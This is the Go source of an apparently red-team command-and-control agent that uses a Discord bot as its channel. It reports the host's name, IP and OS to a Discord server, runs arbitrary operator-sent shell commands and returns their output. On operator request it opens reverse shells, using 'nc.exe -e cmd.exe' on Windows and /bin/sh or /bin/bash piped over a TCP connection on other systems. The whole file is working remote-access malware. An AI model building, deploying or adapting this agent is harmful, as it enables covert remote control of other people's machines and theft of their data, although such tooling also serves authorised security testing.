package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/emmaunel/DiscordGo/pkg/agent"
	"github.com/emmaunel/DiscordGo/pkg/message"
	"github.com/emmaunel/DiscordGo/pkg/util"
	"github.com/emmaunel/DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
)

var newAgent *agent.Agent
var mode string
var channelID *discordgo.Channel

// TODO: Create a flag --mode
// --mode cli and --mode gui(discord)
// Not the server, we would say, if you pick cli, run the server
// first

// Create an Agent
func init() {
	const (
		typemode = "CLI interface if you don't have discord installed or Uses discord desktop or web app to talk to agents"
	)

	flag.StringVar(&mode, "mode", "", typemode)
	flag.Parse()

	if mode == "" {
		println("You need to use the mode flag")
		flag.PrintDefaults()
		os.Exit(1)
	}

	newAgent = &agent.Agent{}
	newAgent.UUID = util.GenerateUUID()
	newAgent.HostName, _ = os.Hostname()
	newAgent.IP = util.GetLocalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows" {
		sys = "Windows"
	} else if runtime.GOOS == "linux" {
		sys = "Linux"
	} else if runtime.GOOS == "darwin" {
		sys = "MacOS"
	}

	newAgent.OS = sys
}

func main() {
	dg, err := discordgo.New("Bot " + constants.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	if util.DEBUG {
		fmt.Println("New Agent Info")
		fmt.Println(newAgent.HostName)
		fmt.Println(newAgent.UUID)
		fmt.Println(newAgent.IP)
		fmt.Println(newAgent.OS)
		fmt.Println()
	}

	// var channelID *discordgo.Channel;
	if mode == "gui" {
		channelID, _ = dg.GuildChannelCreate(constants.ServerID, newAgent.IP, 0)
		// if err != nil{
		// 	panic(err)
		// }
		dg.ChannelEditComplex(channelID.ID, &discordgo.ChannelEdit{ParentID: "892514882174472212"})

		sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
		message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
		dg.ChannelMessagePin(channelID.ID, message.ID)
		dg.AddHandler(guimessageCreater)
	} else {
		firstMessage := newAgent.HostName + ":" + newAgent.IP + ":" + newAgent.OS
		sendMessage := message.NewMessage(newAgent.UUID, firstMessage, false, false, message.MESSAGE_NEW)
		dg.ChannelMessageSend(constants.ChannelID, sendMessage)

		// Register the messageCreate func as a callback for MessageCreate events.
		dg.AddHandler(messageCreator)
	}

	go func(dg *discordgo.Session) {
		ticker := time.NewTicker(time.Duration(1) * time.Minute)
		for {
			<-ticker.C
			go heartBeat(dg)
			ticker.Reset((time.Duration(1) * time.Minute))

		}
	}(dg)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		// fmt.Println("error opening connection,", err)
		return
	}

	if util.DEBUG {
		fmt.Println("Agent is now running.  Press CTRL-C to exit.")
	}
	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
	<-sc

	lastMessage := "[-] Agent " + newAgent.UUID + " has disconnected"
	sendLMessage := message.NewMessage(newAgent.UUID, lastMessage, false, false, message.MESSAGE_DISCONNECT)
	dg.ChannelMessageSend(constants.ChannelID, sendLMessage)

	// Delete a channel
	dg.ChannelDelete(channelID.ID)

	// Cleanly close down the Discord session.
	dg.Close()

}

func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {

	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	// Check if the message is for me
	forMe := false

	if messageJSON.AgentID == newAgent.UUID {
		forMe = true
	}

	if forMe {
		if messageJSON.MessageType == message.MESSAGE_COMMAND {
			result := executeCommand(messageJSON.Message)

			// if the result is more than discord character limit
			// TODO: Divide the results and send it with id
			// {Larger output id:1}
			// {Larger output id:2}
			if len(result) > 2000 {

				fmt.Println("Large output coming up....")
				println(result)

			} else {
				sendMessage := message.NewMessage(newAgent.UUID, result, false, false, message.MESSAGE_OUTPUT)
				dg.ChannelMessageSend(constants.ChannelID, sendMessage)
			}
		} else if messageJSON.MessageType == message.MESSAGE_PING {
			message.Pong(dg, newAgent.UUID, false)
		} else if messageJSON.MessageType == message.MESSAGE_KILL {
			sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_DISCONNECT)
			dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
			// Exit peacefully
			dg.Close()
			os.Exit(0)
		} else if messageJSON.MessageType == message.MESSAGE_SHELL {
			if newAgent.OS == "Windows" {
				sp := strings.Split(messageJSON.Message, ":")
				fmt.Println(sp[0])
				// TODO: Why use nc? find a better solution
				_ = executeCommand("nc.exe -e cmd.exe " + sp[0] + " 4444")
			} else {
				reverseShell(messageJSON.Message)
			}
		}
		// else if messageJSON.MessageType == message.MESSAGE_PONG {
		// 	println("message:" + messageJSON.Message)
		// }
	}
}

func heartBeat(dg *discordgo.Session) {
	newMessage := message.NewMessage(newAgent.UUID, fmt.Sprintf("!heartbeat %v", newAgent.IP), false, false, message.MESSAGE_HEARTBEAT)
	dg.ChannelMessageSend(constants.ChannelID, newMessage)
}

func executeCommand(command string) string {
	args := ""
	result := ""
	var shell, flag string
	var testcmd = command

	if runtime.GOOS == "windows" {
		shell = "cmd"
		flag = "/c"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}

	// Seperate args from command
	ss := strings.Split(command, " ")
	command = ss[0]

	if len(ss) > 1 {
		for i := 1; i < len(ss); i++ {
			args += ss[i] + " "
		}
		args = args[:len(args)-1] // I HATEEEEEEEE GOLANGGGGGG
	}

	if args == "" {
		output, err := exec.Command(shell, flag, command).Output()
		// output, err := exec.Command(command).Output()

		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		if util.DEBUG {
			fmt.Println("Result: " + result)
			fmt.Println(len(result))
		}

	} else {
		// output, err := exec.Command(shell, flag, command, args).Output()
		output, err := exec.Command(shell, flag, testcmd).Output()
		if err != nil {
			// maybe send error to server
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}

		result = string(output)
		if util.DEBUG {
			fmt.Println("Result: " + result)
			fmt.Println(len(result))
		}
	}
	return result
}

// https://stackoverflow.com/questions/49674855/build-error-unknown-field-hidewindow
func reverseShell(host string) {
	fmt.Println("Host: " + host)
	conn, err := net.Dial("tcp", host)
	if err != nil {
		// fmt.Println("Could not connect to server")
		conn.Close()
		return
	}

	sh := exec.Command("/bin/sh")
	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
	sh.Run()
	conn.Close()
}

func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
	if !message.Author.Bot {
		if message.ChannelID == channelID.ID {
			if message.Content == "ping" {
				dg.ChannelMessageSend(message.ChannelID, "I'm alive bruv")
			} else if message.Content == "kill" {
				dg.ChannelDelete(channelID.ID)
				os.Exit(0)
			} else if strings.Contains(message.Content, "cd") { // TODO:
				commandBreakdown := strings.Fields(message.Content)
				os.Chdir(commandBreakdown[1])
				dg.ChannelMessageSend(message.ChannelID, "```Directory changed to "+commandBreakdown[1]+"```")
			} else if strings.Contains(message.Content, "shell") {
				splitCommand := strings.Fields(message.Content)
				if len(splitCommand) == 1 {
					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell python 127.0.0.1 69696\n Shell type: bash, sh, python and nc```")
				} else if len(splitCommand) == 4 {
					shelltype := splitCommand[1]
					if shelltype == "bash" {
						hhh := splitCommand[2] + ":" + splitCommand[3]
						conn, _ := net.Dial("tcp", hhh)
						if conn == nil {
							// println("please don't crash")
							return
						}

						sh := exec.Command("/bin/bash")
						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
						sh.Run()
						// dg.ChannelMessageSend(message.ChannelID,  "```You should receive a shell at port ####```")
						conn.Close()
					} else if shelltype == "python" {

					} else if shelltype == "sh" {
						hhh := splitCommand[2] + ":" + splitCommand[3]
						conn, _ := net.Dial("tcp", hhh)
						if conn == nil {
							println("please don't crash")
							return
						}

						sh := exec.Command("/bin/sh")
						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
						sh.Run()
						// dg.ChannelMessageSend(message.ChannelID,  "```You should receive a shell at port ####```")
						conn.Close()
					} else if shelltype == "nc" {

					} else {
						dg.ChannelMessageSend(message.ChannelID, "```Not a supported shell type```")
					}
				} else {
					dg.ChannelMessageSend(message.ChannelID, "``` Incomplete command ```")
				}
			} else {
				output := executeCommand(message.Content)
				if output == "" {
					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
				} else if len(output) > 2000 {
					firsthalf := output[:1900]
					otherhalf := output[1900:]
					dg.ChannelMessageSend(message.ChannelID, "```"+firsthalf+"```")
					dg.ChannelMessageSend(message.ChannelID, "```"+otherhalf+"```")
				} else {
					dg.ChannelMessageSend(message.ChannelID, "```"+output+"```")
				}
			}
		}
	}
}
